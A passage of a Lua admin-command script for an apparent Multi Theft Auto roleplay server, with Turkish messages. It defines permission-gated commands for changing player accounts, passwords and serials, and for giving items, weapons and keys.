			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					setElementData(targetPlayer, "max_interiors", limit)
					dbExec(
						exports.mek_mysql:getConnection(),
						"UPDATE characters SET max_interiors = ? WHERE id = ?",
						limit,
						getElementData(targetPlayer, "dbid")
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. targetPlayerName
							.. " isimli oyuncunun ev limiti ["
							.. limit
							.. "] olarak değiştirildi.",
						thePlayer,
						0,
						255,
						0,
						true
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili ev limitinizi ["
							.. limit
							.. "] olarak değiştirildi.",
						targetPlayer,
						0,
						0,
						255,
						true
					)
					exports.mek_logs:addLog(
						"setintlimit",
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili "
							.. targetPlayerName
							.. " isimli oyuncunun ec limiti ["
							.. limit
							.. "] olarak değiştirildi."
					)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Limit]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setintlimit", setInteriorLimit, false, false)

-- function earthquake(thePlayer, commandName)
	-- if exports.mek_integration:isPlayerServerManager(thePlayer) then
		-- for _, player in ipairs(getElementsByType("player")) do
			-- triggerClientEvent(root, "doEarthquake", player)
		-- end
	-- else
		-- outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	-- end
-- end
-- addCommandHandler("deprem", earthquake, false, false)

function getPlayerID(thePlayer, commandName, targetPlayer)
	if targetPlayer then
		local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
		if targetPlayer then
			if getElementData(targetPlayer, "logged") then
				local id = getElementData(targetPlayer, "id")
				local level = getElementData(targetPlayer, "level")
				outputChatBox(
					">>#FFFFFF " .. targetPlayerName .. " isimli oyuncunun ID: " .. id .. " - Seviye: " .. level,
					thePlayer,
					0,
					255,
					0,
					true
				)
			else
				outputChatBox(
					"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
					thePlayer,
					255,
					0,
					0,
					true
				)
			end
		end
	else
		outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
	end
end
addCommandHandler("getid", getPlayerID, false, false)
addCommandHandler("id", getPlayerID, false, false)

function setUsername(thePlayer, commandName, username, newUsername)
	if exports.mek_integration:isPlayerManager(thePlayer) then
		if username and newUsername then
			dbQuery(function(queryHandle)
				local results, rows = dbPoll(queryHandle, 0)
				if rows > 0 and results[1] then
					local data = results[1]
					local query = dbExec(
						exports.mek_mysql:getConnection(),
						"UPDATE accounts SET username = ? WHERE id = ? LIMIT 1",
						newUsername,
						tonumber(data.id)
					)
					if query then
						for _, player in ipairs(getElementsByType("player")) do
							if getElementData(player, "account_username") == username then
								setElementData(player, "account_username", newUsername)
							end
						end

						outputChatBox(
							"[!]#FFFFFF ["
								.. username
								.. "] isimli kullanıcının kullanıcı adı ["
								.. newUsername
								.. "] olarak değiştirildi.",
							thePlayer,
							0,
							255,
							0,
							true
						)
						exports.mek_logs:addLog(
							"setusername",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili ["
								.. username
								.. "] isimli kullanıcının kullanıcı adını ["
								.. newUsername
								.. "] olarak değiştirildi."
						)
					else
						outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox("[!]#FFFFFF Kullanıcı adı bulunamadı.", thePlayer, 255, 0, 0, true)
				end
			end, exports.mek_mysql:getConnection(), "SELECT * FROM accounts WHERE username = ? LIMIT 1", username)
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Kullanıcı Adı] [Yeni Kullanıcı Adı]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setusername", setUsername, false, false)

function setPassword(thePlayer, commandName, username, password, passwordAgain)
	if exports.mek_integration:isPlayerManager(thePlayer) then
		if username and password and passwordAgain then
			if #password >= 6 and #password <= 32 then
				if password == passwordAgain then
					dbQuery(
						function(queryHandle)
							local results, rows = dbPoll(queryHandle, 0)
							if rows > 0 and results[1] then
								local data = results[1]

								local salt = exports.mek_global:generateSalt(16)
								local saltedPassword = salt .. password
								local hashedPassword = string.lower(hash("sha256", saltedPassword))

								local query = dbExec(
									exports.mek_mysql:getConnection(),
									"UPDATE accounts SET password = ?, salt = ? WHERE id = ? LIMIT 1",
									hashedPassword,
									salt,
									tonumber(data.id)
								)
								if query then
									outputChatBox(
										"[!]#FFFFFF ["
											.. username
											.. "] isimli kullanıcının şifresi değiştirildi.",
										thePlayer,
										0,
										255,
										0,
										true
									)
									exports.mek_logs:addLog(
										"setpassword",
										exports.mek_global:getPlayerFullAdminTitle(thePlayer)
											.. " isimli yetkili ["
											.. username
											.. "] isimli kullanıcının şifresi değiştirldi."
									)
								else
									outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
								end
							else
								outputChatBox("[!]#FFFFFF Kullanıcı adı bulunamadı.", thePlayer, 255, 0, 0, true)
							end
						end,
						exports.mek_mysql:getConnection(),
						"SELECT * FROM accounts WHERE username = ? LIMIT 1",
						username
					)
				else
					outputChatBox("[!]#FFFFFF Şifreler uygun değil.", thePlayer, 255, 0, 0, true)
				end
			else
				outputChatBox("[!]#FFFFFF Şifre 6 ile 32 arasında olmalıdır.", thePlayer, 255, 0, 0, true)
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Kullanıcı Adı] [Yeni Şifreniz] [Yeni Şifreniz 2x]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setpassword", setPassword, false, false)

function setSerial(thePlayer, commandName, username, newSerial)
	if exports.mek_integration:isPlayerManager(thePlayer) then
		if username and newSerial then
			dbQuery(function(queryHandle)
				local results, rows = dbPoll(queryHandle, 0)
				if rows > 0 and results[1] then
					local data = results[1]
					local query = dbExec(
						exports.mek_mysql:getConnection(),
						"UPDATE accounts SET serial = ? WHERE id = ? LIMIT 1",
						newSerial,
						tonumber(data.id)
					)
					if query then
						outputChatBox(
							"[!]#FFFFFF ["
								.. username
								.. "] isimli kullanıcının serialı ["
								.. newSerial
								.. "] olarak değiştirildi.",
							thePlayer,
							0,
							255,
							0,
							true
						)
						exports.mek_logs:addLog(
							"setserial",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili ["
								.. username
								.. "] isimli kullanıcının serialı ["
								.. newSerial
								.. "] olarak değiştirildi."
						)
					else
						outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox("[!]#FFFFFF Kullanıcı adı bulunamadı.", thePlayer, 255, 0, 0, true)
				end
			end, exports.mek_mysql:getConnection(), "SELECT * FROM accounts WHERE username = ? LIMIT 1", username)
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Kullanıcı Adı] [Yeni Serial]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setserial", setSerial, false, false)

function getKey(thePlayer, commandName)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		local adminName = getPlayerName(thePlayer):gsub(" ", "_")
		local theVehicle = getPedOccupiedVehicle(thePlayer)
		if theVehicle then
			local vehID = getElementData(theVehicle, "dbid")

			givePlayerItem(thePlayer, "giveitem", adminName, "3", tostring(vehID))
			outputChatBox(
				"[!]#FFFFFF Başarıyla [" .. vehID .. "] ID'li aracın anahtarı çıkarıldı.",
				thePlayer,
				0,
				255,
				0,
				true
			)
			exports.mek_global:sendMessageToAdmins(
				"[ADM] "
					.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
					.. " isimli yetkili ["
					.. vehID
					.. "] ID'li aracın anahtarını çıkardı."
			)
			exports.mek_logs:addLog(
				"getkey",
				exports.mek_global:getPlayerFullAdminTitle(thePlayer)
					.. " isimli yetkili ["
					.. vehID
					.. "] ID'li aracın anahtarını çıkardı."
			)
		else
			local intID = getElementDimension(thePlayer)
			if intID then
				local foundIntID = false
				local keyType = false

				for _, theInterior in pairs(getElementsByType("interior")) do
					if getElementData(theInterior, "dbid") == intID then
						local intType = getElementData(theInterior, "status")[1]
						if intType == 0 or intType == 2 or intType == 3 then
							keyType = 4
						else
							keyType = 5
						end
						foundIntID = intID
						break
					end
				end

				if foundIntID and keyType then
					givePlayerItem(thePlayer, "giveitem", adminName, tostring(keyType), tostring(foundIntID))
					outputChatBox(
						"[!]#FFFFFF Başarıyla [" .. vehID .. "] ID'li interiorun anahtar çıkarıldı.",
						thePlayer,
						0,
						255,
						0,
						true
					)
					exports.mek_global:sendMessageToAdmins(
						"[ADM] "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili ["
							.. foundIntID
							.. "] ID'li interiorun anahtarını çıkardı."
					)
					exports.mek_logs:addLog(
						"getkey",
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili ["
							.. foundIntID
							.. "] ID'li interiorun anahtarını çıkardı."
					)
				else
					outputChatBox("[!]#FFFFFF Lütfen araca veya interiora girin.", thePlayer, 255, 0, 0, true)
				end
			end
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("getkey", getKey, false, false)

function setServerPasswordCommand(thePlayer, commandName, password)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		outputChatBox("Kullanım: /" .. commandName .. " [Şifre]", thePlayer, 255, 194, 14)
		if password and #password > 0 then
			if setServerPassword(password) then
				exports.mek_global:sendMessageToAdmins(
					"[SERVER] "
						.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
						.. " isimli yetkili sunucunun sunucunun şifresini değiştirdi. ("
						.. password
						.. ")",
					true
				)
			end
		else
			if setServerPassword("") then
				exports.mek_global:sendMessageToAdmins(
					"[SERVER] "
						.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
						.. " isimli yetkili sunucunun şifresini kaldırdı.",
					true
				)
			end
		end
	end
end
addCommandHandler("setserverpassword", setServerPasswordCommand, false, false)
addCommandHandler("setserverpw", setServerPasswordCommand, false, false)

function giveawayCommand(thePlayer, commandName)
	if exports.mek_integration:isPlayerManager(thePlayer) then
		local eligiblePlayers = {}

		for _, player in ipairs(getElementsByType("player")) do
			if getElementData(player, "logged") then
				table.insert(eligiblePlayers, player)
			end
		end

		if #eligiblePlayers > 0 then
			local randomIndex = math.random(1, #eligiblePlayers)
			local randomPlayer = eligiblePlayers[randomIndex]

			outputChatBox(
				">>#FFFFFF "
					.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
					.. " isimli yetkili tarafından seçilen rastgele oyuncu: "
					.. getPlayerName(randomPlayer):gsub("_", " ")
					.. " ("
					.. (getElementData(randomPlayer, "id") or 0)
					.. ")",
				root,
				0,
				255,
				0,
				true
			)
		else
			outputChatBox("[!]#FFFFFF Seçilebilecek giriş yapmış oyuncu yok.", thePlayer, 255, 0, 0, true)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("giveaway", giveawayCommand, false, false)

function blowPlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					local x, y, z = getElementPosition(targetPlayer)
					createExplosion(x, y, z, 4, thePlayer)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("blow", blowPlayer, false, false)

function flyCommand(thePlayer, commandName)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if getElementData(thePlayer, "duty_admin") then
			triggerClientEvent(thePlayer, "onClientFlyToggle", thePlayer)
		else
			outputChatBox(
				"[!]#FFFFFF Bu komutu kullanabilmek için görevde olmanız gerekmektedir.",
				thePlayer,
				255,
				0,
				0,
				true
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("fly", flyCommand, false, false)

function givePlayerItem(thePlayer, commandName, targetPlayer, itemID, ...)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		if targetPlayer and itemID and tonumber(itemID) and (...) then
			itemID = tonumber(itemID)
			local itemValue = table.concat({ ... }, " ")
			itemValue = tonumber(itemValue) or itemValue

			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					local itemName = exports.mek_item:getItemName(itemID, itemValue)
					if itemID > 0 and itemName and itemName ~= "?" then
						if itemID ~= 112 or exports.mek_integration:isPlayerServerOwner(thePlayer) then
							if exports.mek_item:hasSpaceForItem(targetPlayer, itemID, itemValue) then
								local success, error = exports.mek_item:giveItem(targetPlayer, itemID, itemValue)
								if success then
									outputChatBox(
										"[!]#FFFFFF "
											.. targetPlayerName
											.. " isimli oyuncuya ["
											.. itemName
											.. "] isimli eşyayı ["
											.. itemValue
											.. "] değerinde verildi.",
										thePlayer,
										0,
										255,
										0,
										true
									)
									outputChatBox(
										"[!]#FFFFFF "
											.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
											.. " isimli yetkili size ["
											.. itemName
											.. "] isimli eşyayı ["
											.. itemValue
											.. "] değerinde verdi.",
										targetPlayer,
										0,
										0,
										255,
										true
									)
									exports.mek_logs:addLog(
										"giveitem",
										exports.mek_global:getPlayerFullAdminTitle(thePlayer)
											.. " isimli yetkili "
											.. targetPlayerName
											.. " isimli oyuncuya ["
											.. itemName
											.. "] isimli eşyayı ["
											.. itemValue
											.. "] değerinde verdi."
									)
								else
									outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
								end
							else
								outputChatBox(
									"[!]#FFFFFF Bu oyuncunun envanterinde yeterli alan yok.",
									thePlayer,
									255,
									0,
									0,
									true
								)
							end
						else
							outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
						end
					else
						outputChatBox("[!]#FFFFFF Geçersiz eşya ID.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Eşya ID] [Eşya Değeri]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("giveitem", givePlayerItem, false, false)

function takePlayerItem(thePlayer, commandName, targetPlayer, itemID, ...)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		if targetPlayer and itemID and tonumber(itemID) and (...) then
			itemID = tonumber(itemID)
			local itemValue = table.concat({ ... }, " ")
			itemValue = tonumber(itemValue) or itemValue

			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					if exports.mek_item:hasItem(targetPlayer, itemID, itemValue) then
						exports.mek_item:takeItem(targetPlayer, itemID, itemValue)
						outputChatBox(
							"[!]#FFFFFF "
								.. targetPlayer
								.. " isimli oyuncudan ["
								.. itemValue
								.. "] değeri olan ["
								.. itemID
								.. "] ID'li eşya alındı.",
							thePlayer,
							0,
							255,
							0
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili ["
								.. itemValue
								.. "] değerinde olan ["
								.. itemID
								.. "] ID'li eşyayı aldı.",
							targetPlayer,
							0,
							255,
							0
						)
						exports.mek_logs:addLog(
							"takeitem",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. targetPlayerName
								.. " isimli oyuncudan ["
								.. itemValue
								.. "] değerinde olan ["
								.. itemID
								.. "] ID'li eşyayı aldı."
						)
					else
						outputChatBox("[!]#FFFFFF Oyuncu bu öğeye sahip değil.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Eşya ID] [Eşya Değeri]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("takeitem", takePlayerItem, false, false)

function givePlayerGunWithAmmo(thePlayer, commandName, targetPlayer, weaponID, weaponAmmo)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		if targetPlayer and weaponID and tonumber(weaponID) then
			weaponID = tonumber(weaponID)
			weaponAmmo = tonumber(weaponAmmo) or 3
			
			if getWeaponNameFromID(weaponID) then
				local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
				if targetPlayer then
					if getElementData(targetPlayer, "logged") then
						local weaponSerial = exports.mek_global:createWeaponSerial(
							1,
							getElementData(thePlayer, "dbid"),
							getElementData(targetPlayer, "dbid")
						)
						local itemValue = weaponID .. ":" .. weaponSerial .. ":" .. getWeaponNameFromID(weaponID) .. ":0:" .. weaponAmmo
						
						if exports.mek_item:hasSpaceForItem(targetPlayer, 115, itemValue) then
							local success, error = exports.mek_item:giveItem(targetPlayer, 115, itemValue)
							if success then
								outputChatBox(
									"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncuya " .. getWeaponNameFromID(weaponID) .. " markalı silah verildi. Hak: " .. weaponAmmo,
									thePlayer, 0, 255, 0, true
								)
								outputChatBox(
									"[!]#FFFFFF " .. exports.mek_global:getPlayerFullAdminTitle(thePlayer) .. " isimli yetkili size " .. getWeaponNameFromID(weaponID) .. " markalı silah verdi. Hak: " .. weaponAmmo,
									targetPlayer, 0, 0, 255, true
								)
								exports.mek_logs:addLog(
									"makegun",
									exports.mek_global:getPlayerFullAdminTitle(thePlayer) .. " isimli yetkili " .. targetPlayerName .. " isimli oyuncuya " .. getWeaponNameFromID(weaponID) .. " markalı silah verdi. Hak: " .. weaponAmmo
								)
							else
								outputChatBox("[!]#FFFFFF Bir sorun oluştu: " .. tostring(error), thePlayer, 255, 0, 0, true)
							end
						else
							outputChatBox(
								"[!]#FFFFFF Bu oyuncunun envanterinde yeterli alan yok.",
								thePlayer, 255, 0, 0, true
							)
						end
					else
						outputChatBox(
							"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
							thePlayer, 255, 0, 0, true
						)
					end
				end
			else
				outputChatBox("[!]#FFFFFF Geçersiz silah ID.", thePlayer, 255, 0, 0, true)
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Silah ID] [Hak (Opsiyonel, Varsayılan: 3)]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("mekans535makegun", givePlayerGunWithAmmo, false, false)

function removeAllMasks(thePlayer, commandName)
    if not exports.mek_integration:isPlayerServerOwner(thePlayer) then
        return
    end

    local count = 0
    for key, value in ipairs(getElementsByType("player")) do
        if getElementData(value, "mask") then
            setElementData(value, "mask", false)
            count = count + 1
        end
    end

    outputChatBox("[!]#FFFFFF Toplam " .. count .. " oyuncunun maskesi çıkarıldı.", thePlayer, 0, 255, 0, true)
end
addCommandHandler("removeallmasks", removeAllMasks)

function givePlayerAmmo(thePlayer, commandName, targetPlayer, weaponID, rounds)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		if targetPlayer and weaponID and tonumber(weaponID) then
			weaponID = tonumber(weaponID)
			rounds = tonumber(rounds) or nil
			if getWeaponNameFromID(weaponID) then
				local targetPlayer, targetPlayerName =
					exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
				if targetPlayer then
					if getElementData(targetPlayer, "logged") then
						if exports.mek_weapon:isWeaponAmmoless(weaponID) then
							outputChatBox(
								"[!]#FFFFFF "
									.. getWeaponNameFromID(weaponID)
									.. " isimli silahın mühimmata ihtiyacı yok.",
								thePlayer,
								255,
								0,
								0,
								true
							)
							return
						end

						local success, ammo, error =
							exports.mek_weapon:givePlayerAmmo(thePlayer, targetPlayer, weaponID, nil, rounds)
						if success then
							outputChatBox(
								"[!]#FFFFFF "
									.. targetPlayerName
									.. " isimli oyuncuya "
									.. getWeaponNameFromID(weaponID)
									.. " markalı silah için "
									.. ammo.rounds
									.. " mermili "
									.. ammo.cartridge
									.. " cephane paketi verildi.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							outputChatBox(
								"[!]#FFFFFF "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili size "
									.. getWeaponNameFromID(weaponID)
									.. " markalı silah için "
									.. ammo.rounds
									.. " mermili "
									.. ammo.cartridge
									.. " cephane paketi verdi.",
								targetPlayer,
								0,
								255,
								0,
								true
							)
							exports.mek_logs:addLog(
								"makeammo",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncuya "
									.. getWeaponNameFromID(weaponID)
									.. " markalı silah için "
									.. ammo.rounds
									.. " mermili "
									.. ammo.cartridge
									.. " cephane paketi verdi."
							)
						else
							outputChatBox(
								"[!]#FFFFFF " .. error .. " (" .. getWeaponNameFromID(weaponID) .. ")",
								thePlayer,
								255,
								0,
								0,
								true
							)
						end
					else
						outputChatBox(
							"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
							thePlayer,
							255,
							0,
							0,
							true
						)
					end
				end
			else
				outputChatBox("[!]#FFFFFF Geçersiz silah ID.", thePlayer, 255, 0, 0, true)
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Silah ID] [Mermi]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("mekans535makeammo", givePlayerAmmo, false, false)

function disarmPlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					if disarmingPlayers[targetPlayer] then
						outputChatBox(
							"[!]#FFFFFF Bu oyuncuya zaten silah silme işlemi uygulanıyor.",
							thePlayer,
							255,
							0,
							0,
							true
						)
						return
					end

					disarmingPlayers[targetPlayer] = true

					local weapons = { 115, 116 }
					local index = 1

					local function removeNextWeapon()
						if not isElement(targetPlayer) then
							disarmingPlayers[targetPlayer] = nil
							return
						end

						local weaponID = weapons[index]
						if weaponID and exports.mek_item:takeItem(targetPlayer, weaponID) then
							setTimer(removeNextWeapon, 250, 1)
						else
							index = index + 1
							if weapons[index] then
								setTimer(removeNextWeapon, 250, 1)
							else
								outputChatBox(
									"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncunun tüm silahları silindi.",
									thePlayer,
									0,
									255,
									0,
									true
								)
								outputChatBox(
									"[!]#FFFFFF "
										.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
										.. " isimli yetkili tarafından tüm silahlarınız silindi.",
									targetPlayer,
									255,
									0,
									0,
									true
								)
								exports.mek_global:sendMessageToAdmins(
									"[DISARM] "
										.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
										.. " isimli yetkili "
										.. targetPlayerName
										.. " isimli oyuncunun tüm silahlarını sildi."
								)
								exports.mek_logs:addLog(
									"disarm",
									exports.mek_global:getPlayerFullAdminTitle(thePlayer)
										.. " isimli yetkili "
										.. targetPlayerName
										.. " isimli oyuncunun tüm silahlarını sildi."
								)

								disarmingPlayers[targetPlayer] = nil
							end
						end
					end

					removeNextWeapon()
					outputChatBox("[!]#FFFFFF Lütfen bekleyiniz, işlem gerçekleşiyor.", thePlayer, 0, 0, 255, true)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("mekans535disarm", disarmPlayer, false, false)

function markRoleplaySufficient(thePlayer, commandName, targetPlayer)
	if not exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
		return
	end

	if not targetPlayer then
		outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		return
	end

	local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
	if not targetPlayer then
		return
	end

	if not getElementData(targetPlayer, "logged") then
		outputChatBox(
			"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
			thePlayer,
			255,
			0,
			0,
			true
		)
		return
	end

	if getElementData(targetPlayer, "rp_confirm") then
		outputChatBox(
			"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncunun rol bilgisi zaten yeterli olarak belirlenmiş.",
			thePlayer,
			255,
			0,
			0,
			true
		)
		return
	end

	addAdminHistory(targetPlayer, thePlayer, "Rol dersi onaylandı.", 3, 0)
	setElementData(targetPlayer, "rp_confirm", true)
	dbExec(
		exports.mek_mysql:getConnection(),
		"UPDATE accounts SET rp_confirm = 1 WHERE id = ?",
		getElementData(targetPlayer, "account_id")
	)

	outputChatBox(
		"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncunun rol bilgisinin yeterli olduğunu bildirdiniz.",
		thePlayer,
		0,
		255,
		0,
		true
	)
	outputChatBox(
		"[!]#FFFFFF "
			.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
			.. " isimli yetkili yeterli rol bilginizin olduğunu belirtti.",
		targetPlayer,
		0,
		0,
		255,
		true
	)
end
addCommandHandler("rolver", markRoleplaySufficient, false, false)

function markRoleplayInsufficient(thePlayer, commandName, targetPlayer)
	if not exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
		return
	end

	if not targetPlayer then
		outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		return
	end

	local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
	if not targetPlayer then
		return
	end

	if not getElementData(targetPlayer, "logged") then
		outputChatBox(
			"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
			thePlayer,
			255,
			0,
			0,
			true
		)
		return
	end

	if not getElementData(targetPlayer, "rp_confirm") then
		outputChatBox(
			"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncunun rol bilgisi zaten yetersiz olarak belirlenmiş.",
			thePlayer,
			255,
			0,
			0,
			true
		)
		return
	end

	addAdminHistory(targetPlayer, thePlayer, "Rol bilgisi yetersiz.", 4, 0)
	setElementData(targetPlayer, "rp_confirm", false)
	dbExec(
		exports.mek_mysql:getConnection(),
		"UPDATE accounts SET rp_confirm = 0 WHERE id = ?",
		getElementData(targetPlayer, "account_id")
	)

	outputChatBox(
		"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncunun rol bilgisinin yetersiz olduğunu bildirdiniz.",
		thePlayer,
		0,
		255,
		0,
		true
	)
	outputChatBox(
		"[!]#FFFFFF "
			.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
			.. " isimli yetkili yeterli rol bilginizin olmadığını belirtti.",
		targetPlayer,
		0,
		0,
		255,
		true
	)
end
addCommandHandler("rolal", markRoleplayInsufficient, false, false)

function listPlayersNeedingRoleplayTraining(thePlayer)
